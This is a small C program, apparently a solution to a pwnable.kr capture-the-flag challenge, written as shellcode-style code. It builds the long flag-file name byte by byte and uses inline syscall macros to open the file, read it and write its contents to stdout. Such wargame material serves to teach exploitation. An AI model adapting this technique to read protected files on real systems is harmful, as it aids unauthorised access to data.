#include <sys/types.h>
#include <asm/unistd.h>

_start(){

  char file[232];
  file[0] = 't';
  file[1] = 'h';
  file[2] = 'i';
  file[3] = 's';
  file[4] = '_';
  file[5] = 'i';
  file[6] = 's';
  file[7] = '_';
  file[8] = 'p';
  file[9] = 'w';
  file[10] = 'n';
  file[11] = 'a';
  file[12] = 'b';
  file[13] = 'l';
  file[14] = 'e';
  file[15] = '.';
  file[16] = 'k';
  file[17] = 'r';
  file[18] = '_';
  file[19] = 'f';
  file[20] = 'l';
  file[21] = 'a';
  file[22] = 'g';
  file[23] = '_';
  file[24] = 'f';
  file[25] = 'i';
  file[26] = 'l';
  file[27] = 'e';
  file[28] = '_';
  file[29] = 'p';
  file[30] = 'l';
  file[31] = 'e';
  file[32] = 'a';
  file[33] = 's';
  file[34] = 'e';
  file[35] = '_';
  file[36] = 'r';
  file[37] = 'e';
  file[38] = 'a';
  file[39] = 'd';
  file[40] = '_';
  file[41] = 't';
  file[42] = 'h';
  file[43] = 'i';
  file[44] = 's';
  file[45] = '_';
  file[46] = 'f';
  file[47] = 'i';
  file[48] = 'l';
  file[49] = 'e';
  file[50] = '.';
  file[51] = 's';
  file[52] = 'o';
  file[53] = 'r';
 file[54] = 'r';
 file[55] = 'y';
 file[56] = '_';
 file[57] = 't';
file[58] = 'h';
file[59] = 'e';
file[60] = '_';
file[61] = 'f';
file[62] = 'i';
file[63] = 'l';
file[64] = 'e';
file[65] = '_';
file[66] = 'n';
file[67] = 'a';
file[68] = 'm';
file[69] = 'e';
file[70] = '_';
file[71] = 'i';
file[72] = 's';
file[73] = '_';
file[74] = 'v';
file[75] = 'e';
file[76] = 'r';
file[77] = 'y';
file[78] = '_';
file[79] = 'l';
file[181] = 'o';
file[182] = 'o';
file[183] = 'o';
file[184] = 'o';
file[185] = 'o';
file[186] = 'o';
file[187] = 'o';
file[188] = 'o';
file[189] = 'o';
file[190] = 'o';
file[191] = 'o';
file[192] = 'o';
file[193] = 'o';
file[194] = 'o';
file[195] = 'o';
file[196] = 'o';
file[197] = 'o';
file[198] = 'o';
file[199] = 'o';
file[200] = 'o';
file[201] = 'o';
file[202] = 'o';
file[203] = 'o';
file[204] = '0';
file[205] = '0';
file[206] = '0';
file[207] = '0';
file[208] = '0';
file[209] = '0';
file[210] = '0';
file[211] = '0';
file[212] = '0';
file[213] = '0';
file[214] = '0';
file[215] = '0';
file[216] = 'o';
file[217] = '0';
file[218] = 'o';
file[219] = '0';
file[220] = 'o';
file[221] = '0';
file[222] = 'o';
file[223] = '0';
file[224] = 'o';
file[225] = '0';
file[226] = 'o';
file[227] = '0';
file[228] = 'o';
 file[229] = 'n';
 file[230] = 'g';
 file[231] = '\0';


#define mysyscall3(name,ret,arg1,arg2,arg3)     \
 __asm__ volatile("syscall"                     \
                  : "=a"( ret )                 \
                  : "a"( __NR_##name ),         \
                    "D"( arg1 ),                \
                    "S"( arg2 ),                \
                    "d"( arg3 )                 \
                  : "memory", "rcx", "r11"      \
                  );

#define mysyscall1(name,ret,arg1)                               \
 __asm__ volatile ("syscall"                                     \
                   : "=a" (ret)                                 \
                   : "a" (__NR_##name),"D" (arg1));

 int fd;
 int ret;
 for(fd=80;fd<156;fd++)
   file[fd] = 'o';
 for(fd=156;fd<181;fd++)
   file[fd] = '0';

 mysyscall3(open,fd,file,0000,0);
 char buf[129];
   buf[128] = '\0';
 buf[127] = '\n';
 mysyscall3(read,ret,fd,buf,128);
 mysyscall3(write,ret,1,buf,128);
 mysyscall1(exit,ret,123);

}
